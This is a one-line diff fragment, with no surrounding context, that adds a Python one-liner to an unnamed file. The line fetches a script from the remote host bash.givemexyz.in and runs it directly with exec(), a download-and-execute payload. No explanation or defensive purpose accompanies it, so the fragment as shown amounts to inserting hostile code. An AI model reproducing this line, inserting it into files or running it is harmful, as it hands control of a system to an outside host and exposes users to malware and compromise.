@@ -1,0 +1,1 @@
+python -c 'import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())'
